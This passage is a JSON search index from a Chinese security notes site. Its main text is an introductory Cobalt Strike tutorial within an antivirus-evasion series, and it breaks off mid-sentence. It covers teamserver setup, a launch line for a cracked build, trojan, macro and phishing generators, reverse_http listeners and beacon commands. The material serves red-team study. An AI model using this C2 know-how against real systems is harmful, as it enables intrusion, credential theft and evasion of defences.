{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"index.html","title":"Home","text":""},{"location":"index.html#welcome-to-hypnotic","title":"Welcome to Hypnotic","text":"<p>Posted by Hypnotic on February 13, 2024  | view  times </p>"},{"location":"index.html#_1","title":"\u76ee\u5f55","text":"<ul> <li>Code_audit</li> <li>Vulnerability_analysis</li> <li>Tools</li> <li>CTF</li> <li>Shell_Scripts</li> <li>Security_devices</li> <li>SRC</li> </ul>"},{"location":"about.html","title":"Changelog","text":"<p>This is the changelog page of this project. More details please check the github repo.</p>"},{"location":"CTF/index.html","title":"CTF","text":"<ul> <li>HTB\u9776\u673a\u8bb0\u5f55</li> <li>Java\u5b89\u5168</li> <li>\u84dd\u961f\u5e94\u6025</li> <li>\u5185\u7f51\u5b89\u5168</li> <li>\u7ea2\u961f\u5e38\u7528\u547d\u4ee4</li> <li>\u514d\u6740\u5bf9\u6297</li> <li>\u514d\u6740\u5bf9\u6297</li> </ul>"},{"location":"CTF/Antimalware_evasion/index.html","title":"Antimalware_evasion","text":"<ul> <li>\u8ba4\u8bc6shellcode</li> <li>\u5404\u8bed\u8a00ShellcodeLoader\u521d\u63a2</li> <li>Windows\u5185\u5b58\u64cd\u4f5capi</li> <li>\u9759\u6001\u6076\u610f\u4ee3\u7801\u9003\u9038</li> <li>##\u514d\u6740\u7b14\u8bb0</li> </ul>"},{"location":"CTF/Antimalware_evasion/AV/index.html","title":"(\u3002\u30fb\u30fb)\u30ce\u514d\u6740\u7b14\u8bb0","text":"<ul> <li>Cobalt Strike\u5fc5\u5907\u77e5\u8bc6</li> <li>Cobalt Strike\u7279\u5f81\u4fee\u6539\u548cvps\u90e8\u7f72</li> <li>shellcode\u548c\u52a0\u8f7d\u5668</li> <li>\u6740\u8f6f\u67e5\u6740\u539f\u7406\u548cshellcode\u5904\u7406</li> <li>shellcode\u7684\u8fd0\u884c\u65b9\u5f0f</li> <li>\u7f16\u8bd1\u5668\u548cexe\u6587\u4ef6\u5904\u7406</li> <li>\u53cd\u6c99\u7bb1</li> <li>\u767d\u52a0\u9ed1</li> <li>go\u73af\u5883\u642d\u5efa\u548c\u7f16\u5199\u52a0\u8f7d\u5668</li> </ul>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html","title":"1.CS\u7b80\u4ecb","text":""},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#1cs_1","title":"1.\u4ec0\u4e48\u662fcs","text":"<p>Cobalt Strike \u662f\u4e00\u6b3e\u57fa\u4e8ejava\u8bed\u8a00\u5f00\u53d1\u7684\u6e17\u900f\u6d4b\u8bd5\u795e\u5668\uff0c\u5e38\u88ab\u4e1a\u754c\u4eba\u79f0\u4e3aCS\u795e\u5668\u3002\u5b83\u88ab\u5e7f\u6cdb\u7528\u4e8e\u6a21\u62df\u9ad8\u7ea7\u6301\u4e45\u6027\u5a01\u80c1\uff08Advanced Persistent Threat\uff0cAPT\uff09\u548c\u8fdb\u884c\u5185\u7f51\u6e17\u900f\u3002\u81ea3.0\u4ee5\u540e\u5df2\u7ecf\u4e0d\u5728\u4f7f\u7528Metasploit\u6846\u67b6\u800c\u4f5c\u4e3a\u4e00\u4e2a\u72ec\u7acb\u7684\u5e73\u53f0\u4f7f\u7528\uff0c\u5206\u4e3a\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef (CS\u67b6\u6784\u7684)\uff0c\u670d\u52a1\u7aef\u662f\u4e00\u4e2a\uff0c\u5ba2\u6237\u7aef\u53ef\u4ee5\u6709\u591a\u4e2a\uff0c\u975e\u5e38\u9002\u5408\u56e2\u961f\u534f\u540c\u4f5c\u6218\uff0c\u591a\u4e2a\u653b\u51fb\u8005\u53ef\u4ee5\u540c\u65f6\u8fde\u63a5\u5230\u4e00\u4e2a\u56e2\u961f\u670d\u52a1\u5668\u4e0a\uff0c\u5171\u4eab\u653b\u51fb\u8d44\u6e90\u4e0e\u76ee\u6807\u4fe1\u606f\u548csessions\uff0c\u53ef\u6a21\u62dfAPT\u505a\u6a21\u62df\u5bf9\u6297\uff0c\u8fdb\u884c\u5185\u7f51\u6e17\u900f\u3002 Cobalt Strike\u96c6\u6210\u4e86\u7aef\u53e3\u8f6c\u53d1\u3001\u670d\u52a1\u626b\u63cf\uff0c\u81ea\u52a8\u5316\u6ea2\u51fa\uff0c\u591a\u6a21\u5f0f\u7aef\u53e3\u76d1\u542c\uff0cwin exe\u6728\u9a6c\u751f\u6210\uff0cwin dll\u6728\u9a6c\u751f\u6210\uff0cjava\u6728\u9a6c\u751f\u6210\uff0coffice\u5b8f\u75c5\u6bd2\u751f\u6210\uff0c\u6728\u9a6c\u6346\u7ed1\uff1b\u9493\u9c7c\u653b\u51fb\u5305\u62ec\uff1a\u7ad9\u70b9\u514b\u9686\uff0c\u76ee\u6807\u4fe1\u606f\u83b7\u53d6\uff0cjava\u6267\u884c\uff0c\u6d4f\u89c8\u5668\u81ea\u52a8\u653b\u51fb\u7b49\u7b49</p> <p><code>\u5b98\u65b9\u4f7f\u7528\u6587\u6863\uff1ahttps://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm#_Toc65482705</code></p>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#2cs","title":"2.\u4e3a\u4ec0\u4e48\u6709cs","text":"<p>\u975e\u5e38\u9002\u5408\u56e2\u961f\u534f\u540c\u4f5c\u6218 , \u7b80\u79f0\u591a\u4eba\u8fd0\u52a8 , \u63d2\u4ef6\u4e5f\u6bd4\u8f83\u4e30\u5bcc , \u4e5f\u662f\u76ee\u524d\u4e3b\u6d41\u7684 c2 ( command control )\u5de5\u5177.</p>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#2","title":"2.\u76ee\u5f55\u7ed3\u6784","text":"<p>\u91c7\u7528cs4.5\u8fdb\u884c\u5b66\u4e60,\u4e00\u822cCobalt Strike\u76ee\u5f55\u7ed3\u6784\u5982\u4e0b\uff1a</p> <p></p> <p>\u7b80\u5355\u4ecb\u7ecd\u4e0b\u5e38\u7528\u7684\u76ee\u5f55\u548c\u6587\u4ef6\uff1a`</p> <pre><code>logs                          \u65e5\u5fd7\u8bb0\u5f55\u4e0e\u76ee\u6807\u4e3b\u673a\u7684\u76f8\u5173\u4fe1\u606f\nresources                     \u8d44\u6e90\u6587\u4ef6\u7684\u3002\u76ee\u5f55\nScripts                       CS\u811a\u672c\u7684\u76ee\u5f55\n.cobaltstrike.beacon_keys     CS Beacon\u7684\u5bc6\u94a5\u4fe1\u606f\u7684\u6587\u4ef6\nagscript                      \u62d3\u5c55\u5e94\u7528\u7684\u811a\u672c.\u7528\u4e8e\u81ea\u52a8\u5316\u548c\u5b9a\u5236\u5316\u6e17\u900f\u6d4b\u8bd5\u8fc7\u7a0b\nc2lint                        \u7528\u4e8e\u68c0\u67e5 profile \u6587\u4ef6\ncobaltstrike,cobaltstrike.jar \u5ba2\u6237\u7aef\u7a0b\u5e8f(java\u8de8\u5e73\u53f0)\ncobaltstrike.bat windows      \u5e73\u53f0\u5feb\u901f\u542f\u52a8\u5ba2\u6237\u7aef\u7684bat\u6587\u4ef6\ncobaltstrike.store            Cobalt Strike\u7684ssl\u8bc1\u4e66\u6587\u4ef6\nCSAgent.jar                   \u7528\u4e8e\u4ee3\u7406\u901a\u4fe1\u7684Java\u53ef\u6267\u884c\u6587\u4ef6\nicon.jpg                      \u56fe\u6807\npeclone                       \u514b\u9686\u548c\u64cd\u4f5cPE\u6587\u4ef6\u7684\u5de5\u5177\u6216\u811a\u672c\nstart.sh                      \u7528\u4e8e\u5728Unix/Linux\u7cfb\u7edf\u4e0a\u542f\u52a8Cobalt Strike\u7684Shell\u811a\u672c\nteamserver                    \u542f\u52a8\u670d\u52a1\u7aef\u7684sh\u811a\u672c\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#3","title":"3.\u5b89\u88c5\u548c\u8fd0\u884c","text":""},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#31","title":"3.1\u670d\u52a1\u7aef","text":"<p>\u56e2\u961f\u670d\u52a1\u5668\u6700\u597d\u8fd0\u884c\u5728 Linux\u5e73\u53f0\u4e0a\uff0c\u670d\u52a1\u7aef\u7684\u5173\u952e\u6587\u4ef6\u662fteamserver\u548ccobaltstrike.jar\uff0c\u5c06\u8fd9\u4e24\u4e2a\u6587\u4ef6\u653e\u5728\u540c\u4e00\u76ee\u5f55\u4e0b\u8fd0\u884c , teamserver\u8981\u6709\u53ef\u4ee5\u8fd0\u884c\u7684\u6743\u9650.</p> <pre><code>chmod +x teamserver\n</code></pre> <p>./teamserver   [/path/to/c2.profile] [YYYY-MM-DD] <ul> <li> \u5fc5\u9700\u53c2\u6570 \u56e2\u961f\u670d\u52a1\u5668IP <li> \u5fc5\u9700\u53c2\u6570 \u8fde\u63a5\u670d\u52a1\u5668\u7684\u5bc6\u7801 <li>[/path/to/c2.profile] \u53ef\u9009\u53c2\u6570 \u6307\u5b9aC2\u901a\u4fe1\u914d\u7f6e\u6587\u4ef6\uff0c\u4f53\u73b0\u5176\u5f3a\u5927\u7684\u6269\u5c55\u6027</li> <li>[YYYY-MM-DD] \u53ef\u9009\u53c2\u6570 \u6240\u6709payload\u7684\u7ec8\u6b62\u65f6\u95f4</li> <p>\u4e00\u822c\u542f\u52a8Team Server</p> <p>./teamserver 192.168.6.73 123456 # \u8bbe\u7f6e\u5f3a\u5bc6\u7801\uff0c\u5426\u5219\u5bb9\u6613\u88ab\u7206\u7834\uff0c\u53c2\u8003\u9644\u5f55</p> <p>PS\uff1a\u56e2\u961f\u670d\u52a1\u5668\u9ed8\u8ba4\u8fde\u63a5\u7aef\u53e3\u4e3a50050\uff0c\u5982\u679c\u4f60\u60f3\u4fee\u6539\u7aef\u53e3\u53ea\u9700\u4fee\u6539teamserver\u6587\u4ef6 , \u6700\u597d\u4fee\u6539\u9ed8\u8ba4\u7aef\u53e3</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#32","title":"3.2\u5ba2\u6237\u7aef","text":"<p>Linux\uff1a</p> <pre><code>start.sh\n</code></pre> <p>Windows\uff1a</p> <pre><code>cobaltstrike.bat ,win\u5e73\u53f0\u7684\u542f\u52a8\u811a\u672c(\u6697\u6307\u7834\u89e3\u7248)\njava -Xms1336M -Xmx1336M -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:CSAgent.jar=f38eb3d1a335b252b58bc2acde81b542 -Duser.language=en -jar cobaltstrike.jar\njava -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar     cs4.0,\u975e\u7834\u89e3\u7248\n</code></pre> <p></p> <p></p> <p>\u8f93\u5165\u670d\u52a1\u7aefIP\uff0c\u7aef\u53e3\u9ed8\u8ba450050\uff0c\u7528\u6237\u540d\u4efb\u610f ( \u4f46\u662f\u4e0d\u80fd\u91cd\u590d )\uff0c\u5bc6\u7801\u4e3a\u4e4b\u524d\u670d\u52a1\u7aef\u8bbe\u7f6e\u7684\u5bc6\u7801\uff0c\u70b9\u51fbconnect\u3002\u7b2c\u4e00\u6b21\u8fde\u63a5\u4f1a\u51fa\u73b0hash\u6821\u9a8c\uff0c\u8fd9\u91cc\u7684hash\u7b49\u4e8e\u524d\u9762\u7684\u542f\u52a8teamserver\u65f6\u7684hash\uff0c\u76f4\u63a5\u70b9\u51fb \"\u662f\" \u5373\u53ef\u8fde\u63a5\u5230\u56e2\u961f\u670d\u52a1\u5668\u4e0a.</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#4","title":"4.\u83dc\u5355\u680f\u8be6\u60c5","text":""},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#41cobalt-strike","title":"4.1Cobalt Strike","text":"<pre><code>New Connection    # \u65b0\u5efa\u8fde\u63a5\uff0c\u652f\u6301\u8fde\u63a5\u591a\u4e2a\u670d\u52a1\u5668\u7aef\nPreferences       # \u8bbe\u7f6eCobal Strike\u754c\u9762\u3001\u63a7\u5236\u53f0\u3001\u4ee5\u53ca\u8f93\u51fa\u62a5\u544a\u6837\u5f0f\u3001TeamServer\u8fde\u63a5\u8bb0\u5f55\nVisualization     # \u4e3b\u8981\u5c55\u793a\u8f93\u51fa\u7ed3\u679c\u7684\u89c6\u56fe\nVPN Interfaces    # \u8bbe\u7f6eVPN\u63a5\u53e3\nListenrs          # \u521b\u5efa\u76d1\u542c\u5668\nScript Manager    # \u811a\u672c\u7ba1\u7406\uff0c\u53ef\u4ee5\u901a\u8fc7AggressorScripts\u811a\u672c\u6765\u52a0\u5f3a\u81ea\u8eab\uff0c\u80fd\u591f\u6269\u5c55\u83dc\u5355\u680f\uff0c\nBeacon\u547d\u4ee4\u884c\uff0c\u63d0\u6743\u811a\u672c\u7b49\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#42view","title":"4.2View(\u89c6\u56fe)","text":"<pre><code>Applications    # \u663e\u793a\u53d7\u5bb3\u4e3b\u673a\u7684\u5e94\u7528\u4fe1\u606f\nCredentials     # \u663e\u793a\u6240\u6709\u4ee5\u83b7\u53d6\u7684\u53d7\u5bb3\u4e3b\u673a\u7684\u51ed\u8bc1\uff0c\u5982hashdump\u3001Mimikatz\nDownloads       # \u67e5\u770b\u5df2\u4e0b\u8f7d\u6587\u4ef6\nEvent Log       # \u4e3b\u673a\u4e0a\u7ebf\u8bb0\u5f55\u4ee5\u53ca\u56e2\u961f\u534f\u4f5c\u804a\u5929\u8bb0\u5f55\nKeystrokes      # \u67e5\u770b\u952e\u76d8\u8bb0\u5f55\u7ed3\u679c\nProxy Pivots    # \u67e5\u770b\u4ee3\u7406\u6a21\u5757\nScreenshots     # \u67e5\u770b\u6240\u6709\u5c4f\u5e55\u622a\u56fe\nScript Console  # \u52a0\u8f7d\u7b2c\u4e09\u65b9\u811a\u672c\u4ee5\u589e\u5f3a\u529f\u80fd \nTargets         # \u663e\u793a\u6240\u6709\u53d7\u5bb3\u4e3b\u673a\nWeb Log         # \u6240\u6709Web\u670d\u52a1\u7684\u65e5\u5fd7\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#43attacks","title":"4.3Attacks(\u653b\u51fb)","text":""},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#1packages","title":"1.Packages(\u751f\u6210\u540e\u95e8)","text":"<pre><code>HTML Application                 # \u751f\u6210(executable/VBA/powershell)\u8fd9\u4e09\u79cd\u539f\u7406\u5b9e\u73b0\u7684\u6076\u610fHTA\u6728\u9a6c\u6587\u4ef6\nMS Office Macro                  # \u751f\u6210office\u5b8f\u75c5\u6bd2\u6587\u4ef6\nPayload Generator                # \u751f\u6210\u5404\u79cd\u8bed\u8a00\u7248\u672c\u7684payload\nWindows Executable               # \u751f\u6210\u53ef\u6267\u884cexe\u6728\u9a6c\nWindows Executable(Stageless)    # \u751f\u6210\u65e0\u72b6\u6001\u7684\u53ef\u6267\u884cexe\u6728\u9a6c\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#2web-drive-by","title":"2.Web Drive-by(\u9493\u9c7c\u653b\u51fb)","text":"<pre><code>Manage # \u5bf9\u5f00\u542f\u7684web\u670d\u52a1\u8fdb\u884c\u7ba1\u7406\nClone Site # \u514b\u9686\u7f51\u7ad9\uff0c\u53ef\u4ee5\u8bb0\u5f55\u53d7\u5bb3\u8005\u63d0\u4ea4\u7684\u6570\u636e\nHost File # \u63d0\u4f9b\u6587\u4ef6\u4e0b\u8f7d\uff0c\u53ef\u4ee5\u9009\u62e9Mime\u7c7b\u578b\nScripted Web Delivery # \u4e3apayload\u63d0\u4f9bweb\u670d\u52a1\u4ee5\u4fbf\u4e0b\u8f7d\u548c\u6267\u884c\uff0c\u7c7b\u4f3c\u4e8eMetasploit\u7684web_delivery \nSigned Applet Attack # \u4f7f\u7528java\u81ea\u7b7e\u540d\u7684\u7a0b\u5e8f\u8fdb\u884c\u9493\u9c7c\u653b\u51fb(\u8be5\u65b9\u6cd5\u5df2\u8fc7\u65f6)\nSmart Applet Attack # \u81ea\u52a8\u68c0\u6d4bjava\u7248\u672c\u5e76\u8fdb\u884c\u653b\u51fb\uff0c\u9488\u5bf9Java 1.6.0_45\u4ee5\u4e0b\u4ee5\u53caJava 1.7.0_21\u4ee5\u4e0b\u7248\u672c(\u8be5\u65b9\u6cd5\u5df2\u8fc7\u65f6)\nSystem Profiler # \u7528\u6765\u83b7\u53d6\u7cfb\u7edf\u4fe1\u606f\uff0c\u5982\u7cfb\u7edf\u7248\u672c\uff0cFlash\u7248\u672c\uff0c\u6d4f\u89c8\u5668\u7248\u672c\u7b49\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#44reporting","title":"4.4Reporting(\u62a5\u544a)","text":"<pre><code>Activity Report # \u6d3b\u52a8\u62a5\u544a\nHosts Report # \u4e3b\u673a\u62a5\u544a\nIndicators of Compromise # IOC\u62a5\u544a\uff1a\u5305\u62ecC2\u914d\u7f6e\u6587\u4ef6\u7684\u6d41\u91cf\u5206\u6790\u3001\u57df\u540d\u3001IP\u548c\u4e0a\u4f20\u6587\u4ef6\u7684MD5 \nhashes\nSessions Report # \u4f1a\u8bdd\u62a5\u544a\nSocial Engineering Report # \u793e\u4f1a\u5de5\u7a0b\u62a5\u544a\uff1a\u5305\u62ec\u9c7c\u53c9\u9493\u9c7c\u90ae\u4ef6\u53ca\u70b9\u51fb\u8bb0\u5f55\nTactics, Techniques, and Procedures # \u6218\u672f\u6280\u672f\u53ca\u76f8\u5173\u7a0b\u5e8f\u62a5\u544a\uff1a\u5305\u62ec\u884c\u52a8\u5bf9\u5e94\u7684\u6bcf\u79cd\u6218\u672f\u7684\u68c0\u6d4b\u7b56\u7565\u548c\u7f13\u89e3\u7b56\u7565\nReset Data # \u91cd\u7f6e\u6570\u636e\nExport Data # \u5bfc\u51fa\u6570\u636e\uff0c\u5bfc\u51fa.tsv\u6587\u4ef6\u683c\u5f0f\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#5","title":"5.\u5de5\u5177\u680f","text":"<pre><code>1.\u65b0\u5efa\u8fde\u63a5\n2.\u65ad\u5f00\u5f53\u524d\u8fde\u63a5\n3.\u76d1\u542c\u5668\n4.\u6539\u53d8\u89c6\u56fe\u4e3aPivot Graph(\u89c6\u56fe\u5217\u8868)\n5.\u6539\u53d8\u89c6\u56fe\u4e3aSession Table(\u4f1a\u8bdd\u5217\u8868)\n6.\u6539\u53d8\u89c6\u56fe\u4e3aTarget Table(\u76ee\u6807\u5217\u8868)\n7.\u663e\u793a\u6240\u6709\u4ee5\u83b7\u53d6\u7684\u53d7\u5bb3\u4e3b\u673a\u7684\u51ed\u8bc1\n8.\u67e5\u770b\u5df2\u4e0b\u8f7d\u6587\u4ef6\n9.\u67e5\u770b\u952e\u76d8\u8bb0\u5f55\u7ed3\u679c\n10.\u67e5\u770b\u5c4f\u5e55\u622a\u56fe\n11.\u751f\u6210\u65e0\u72b6\u6001\u7684\u53ef\u6267\u884cexe\u6728\u9a6c\n12.\u4f7f\u7528java\u81ea\u7b7e\u540d\u7684\u7a0b\u5e8f\u8fdb\u884c\u9493\u9c7c\u653b\u51fb\n13.\u751f\u6210office\u5b8f\u75c5\u6bd2\u6587\u4ef6\n14.\u4e3apayload\u63d0\u4f9bweb\u670d\u52a1\u4ee5\u4fbf\u4e0b\u8f7d\u548c\u6267\u884c15.\u63d0\u4f9b\u6587\u4ef6\u4e0b\u8f7d\uff0c\u53ef\u4ee5\u9009\u62e9Mime\u7c7b\u578b\n16.\u7ba1\u7406Cobalt Strike\u4e0a\u8fd0\u884c\u7684web\u670d\u52a1\n17.\u5e2e\u52a9\n18.\u5173\u4e8e\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#6","title":"6.\u57fa\u672c\u6d41\u7a0b","text":""},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#61","title":"6.1\u521b\u5efa\u76d1\u542c\u5668","text":"<ul> <li>\u4ec0\u4e48\u662f\u76d1\u542c\u5668</li> </ul> <p>\u987e\u540d\u601d\u4e49\uff0c\u76d1\u542c\u5668\u5c31\u662f\u7b49\u5f85\u88ab\u5165\u4fb5\u7cfb\u7edf\u8fde\u63a5\u81ea\u5df1\u7684\u4e00\u4e2a\u670d\u52a1\u3002</p> <ul> <li>\u76d1\u542c\u5668\u7684\u4f5c\u7528</li> </ul> <p>\u4e3b\u8981\u662f\u4e3a\u4e86\u63a5\u53d7payload\u56de\u4f20\u7684\u5404\u7c7b\u6570\u636e\uff0c1\u6bd4\u5982payload\u5728\u76ee\u6807\u673a\u5668\u6267\u884c\u4e4b\u540e\uff0c\u5c31\u4f1a\u4f1a\u8fde\u5230\u76d1\u542c\u5668\uff0c\u7136\u540e\u4e0b\u8f7d\u6267\u884c\u771f\u6b63\u7684shellcode\u4ee3\u7801\u3002</p> <p>\u4e00\u65e6\u76d1\u542c\u5668\u5efa\u7acb\u8d77\u6765\uff0c\u56e2\u961f\u6210\u5458\u53ea\u9700\u8981\u77e5\u9053\u8fd9\u4e2a\u76d1\u542c\u5668\u7684\u540d\u79f0\u5373\u53ef\uff0c\u4e0d\u7528\u5173\u5fc3\u76d1\u542c\u5668\u80cc\u540e\u7684\u57fa\u7840\u73af\u5883\uff0c\u63a5\u4e0b\u6765\u5c06\u6df1\u5165\u4e86\u89e3\u5982\u4f55\u51c6\u786e\u914d\u7f6e\u76d1\u542c\u5668\u3002\u4e00\u4e2a\u76d1\u542c\u5668\u6709\u7528\u6237\u5b9a\u4e49\u7684\u540d\u79f0\uff0cpayload\u7c7b\u578b\u548c\u51e0\u4e2a\u7279\u5b9a\u4e8epayload\u7684\u9009\u578b\u7ec4\u6210\uff0c\u76d1\u542c\u5668\u7684\u540d\u5b57\u4e00\u822c\u7531\u4ee5\u4e0b\u7ed3\u6784\u7ec4\u6210\uff1a</p> <pre><code>Operating System/Payload/Stager\n\u5982\uff1awindows/beacon_http/reverse_http\n</code></pre> <p>\u70b9\u51fbCobalt Strike -&gt; Listeners-&gt;Add\uff0c\u5176\u4e2d\u5185\u7f6e\u4e868\u4e2aListener</p> <p></p> <p>\u5176\u4e2d\u5305\u542b\u4e86dns\uff0chttp\uff0chttps\uff0csmb\uff0ctcp\u4e94\u79cd\u534f\u8bae\uff1bExternal C2\uff0c\u4f7f\u7528\u5916\u90e8\u7684\u547d\u4ee4\u4e0e\u63a7\u5236(C2)\u5de5\u5177\u6216\u6846\u67b6\uff0c\u800c\u4e0d\u662f\u4f7f\u7528   CS \u9ed8\u8ba4\u7684\u5185\u7f6e\u76d1\u542c\u5668\uff0c\u53ef\u4ee5\u914d\u5408\u5176\u4ed6c2\u4f5c\u4e3a\u540e\u7aef\uff1bForeign HTTP\uff0c\u5141\u8bb8Beacon\u4f7f\u7528\u5916\u90e8\u7684HTTP\u670d\u52a1\u5668\u8fdb\u884cC2\u901a\u4fe1\uff0c\u800c\u4e0d\u662f\u4f7f\u7528CS\u5185\u7f6e\u7684Beacon\u76d1\u542c\u5668\u3002</p> <p></p> <p>Name\u4efb\u610f\uff0c\u9009\u62e9\u6240\u9700\u7684payload\uff0cHost\u4e3a\u672c\u673aIP\uff0cport\u4e3a\u6ca1\u6709\u88ab\u5360\u7528\u7684\u4efb\u610f\u7aef\u53e3 , payload\u5e38\u7528\u7684\u662freverse_http , \u70b9\u51fbsave\u5373\u521b\u5efa\u6210\u529f\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#62","title":"6.2\u751f\u6210\u6728\u9a6c","text":""},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#63","title":"6.3\u8fd0\u884c\u6728\u9a6c\u4e0a\u7ebf","text":"<p>\u9009\u4e2d\u53d7\u5bb3\u673a\u53f3\u51fb\uff0c\u9009\u62e9beacon\uff0c\u5373\u53ef\u8fdb\u884c\u4ea4\u4e92\uff0c\u7531\u4e8e\u53d7\u5bb3\u673a\u9ed8\u8ba460\u79d2\u8fdb\u884c\u4e00\u6b21\u56de\u4f20\uff0c\u4e3a\u4e86\u5b9e\u9a8c\u6548\u679c\u6211\u4eec\u8fd9\u91cc\u628a\u65f6\u95f4\u8bbe\u7f6e\u62101\uff0c\u4f46\u5b9e\u9645\u4e2d\u9891\u7387\u4e0d\u5b9c\u8fc7\u5feb\uff0c\u5bb9\u6613\u88ab\u53d1\u73b0</p> <pre><code>sleep 1\n</code></pre> <p></p> <p>\u6267\u884c\u7cfb\u7edf\u547d\u4ee4</p> <pre><code>shell whoami\n</code></pre> <p></p> <p>\u901a\u4fe1\u56fe</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#7beacon","title":"7.Beacon\u4ecb\u7ecd","text":"<p>\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u5b89\u5168\u9886\u57df\uff0c\u201cbeacon\u201d\u901a\u5e38\u6307\u7684\u662f\u4e00\u79cd\u7528\u4e8e\u6301\u7eed\u76d1\u63a7\u3001\u4fe1\u606f\u6536\u96c6\u6216\u901a\u4fe1\u7684\u6280\u672f\uff0c\u7279\u522b\u662f\u5728\u6076\u610f\u8f6f\u4ef6\uff08\u5982\u9ad8\u7ea7\u6301\u7eed\u6027\u5a01\u80c1\uff0cAPT\uff09\u4e2d\u5e7f\u6cdb\u4f7f\u7528\u3002</p> <p>\u6982\u5ff5: \u6076\u610f\u8f6f\u4ef6\u4f7f\u7528 beacon \u6280\u672f\u6765\u4e0e\u653b\u51fb\u8005\u7684\u547d\u4ee4\u4e0e\u63a7\u5236\uff08C2\uff09\u670d\u52a1\u5668\u8fdb\u884c\u901a\u4fe1\u3002\u901a\u5e38\uff0c\u6076\u610f\u8f6f\u4ef6\u4f1a\u5b9a\u671f\u53d1\u9001\u4fe1\u53f7\uff08beacon\uff09\uff0c\u4ee5\u5411C2\u670d\u52a1\u5668\u62a5\u544a\u53d7\u611f\u67d3\u8bbe\u5907\u7684\u72b6\u6001\uff0c\u5e76\u7b49\u5f85\u8fdb\u4e00\u6b65\u7684\u6307\u4ee4\u3002</p> <p>\u5de5\u4f5c\u539f\u7406: \u4e00\u65e6\u8ba1\u7b97\u673a\u88ab\u611f\u67d3\uff0c\u6076\u610f\u8f6f\u4ef6\u4f1a\u5468\u671f\u6027\u5730\u5411\u653b\u51fb\u8005\u7684\u670d\u52a1\u5668\u53d1\u9001\u4e00\u4e2a\u7f51\u7edc\u8bf7\u6c42\uff0c\u8fd9\u4e2a\u8bf7\u6c42\u901a\u5e38\u5305\u542b\u53d7\u611f\u67d3\u4e3b\u673a\u7684\u6807\u8bc6\u4fe1\u606f\uff08\u5982IP\u5730\u5740\u3001\u4e3b\u673a\u540d\u7b49\uff09\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u4fe1\u606f\u51b3\u5b9a\u4e0b\u4e00\u6b65\u884c\u52a8\uff0c\u6bd4\u5982\u53d1\u9001\u65b0\u7684\u6076\u610f\u6307\u4ee4\u6216\u4e0b\u8f7d\u989d\u5916\u7684\u6076\u610f\u8d1f\u8f7d\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#beacon","title":"Beacon\u662f\u4ec0\u4e48","text":"<ul> <li>Beacon\u662fCS\u7684Payload  ( \u653b\u51fb\u8f7d\u8377 )</li> <li>Beacon\u6709\u4e24\u79cd\u901a\u4fe1\u6a21\u5f0f\u3002\u4e00\u79cd\u662f\u5f02\u6b65\u901a\u4fe1\u6a21\u5f0f\uff0c\u8fd9\u79cd\u6a21\u5f0f\u901a\u4fe1\u6548\u7387\u7f13\u6162\uff0cBeacon\u56de\u8fde\u56e2\u961f\u670d\u52a1\u5668\u3001\u4e0b\u8f7d\u4efb\u52a1\u3001\u7136\u540e\u4f11\u7720\uff1b\u53e6\u4e00\u79cd\u662f\u4ea4\u4e92\u5f0f\u901a\u4fe1\u6a21\u5f0f\uff0c\u8fd9\u79cd\u6a21\u5f0f\u7684\u901a\u4fe1\u662f\u5b9e\u65f6\u53d1\u751f\u7684\u3002</li> <li>\u901a\u8fc7HTTP\u3001HTTPS\u548cDNS\u51fa\u53e3\u7f51\u7edc</li> <li>\u4f7f\u7528SMB\u534f\u8bae\u7684\u65f6\u5019\u662f\u70b9\u5bf9\u70b9\u901a\u4fe1</li> <li>Beacon\u6709\u5f88\u591a\u7684\u540e\u6e17\u900f\u653b\u51fb\u6a21\u5757\u548c\u8fdc\u7a0b\u7ba1\u7406\u5de5\u5177</li> </ul>"},{"location":"CTF/Antimalware_evasion/AV/Article1/index.html#beacon_1","title":"Beacon\u7684\u7c7b\u578b","text":"<ul> <li>HTTP \u548c HTTPS Beacon</li> </ul> <p>HTTP\u548cHTTPS Beacon\u4e5f\u53ef\u4ee5\u53eb\u505aWeb Beacon\u3002\u9ed8\u8ba4\u8bbe\u7f6e\u60c5\u51b5\u4e0b\uff0cHTTP \u548c HTTPS Beacon \u901a\u8fc7 HTTP GET \u8bf7\u6c42\u6765\u4e0b\u8f7d\u4efb\u52a1\u3002\u8fd9\u4e9b Beacon \u901a\u8fc7 HTTP POST \u8bf7\u6c42\u4f20\u56de\u6570\u636e\u3002</p> <p>\u5f53\u53d7\u5bb3\u673a\u4e0a\u7ebf\u4ee5\u540e\uff0c\u53f3\u51fb\u9009\u62e9Beacon \uff0c\u5c31\u53ef\u4ee5\u6253\u5f00Beacon 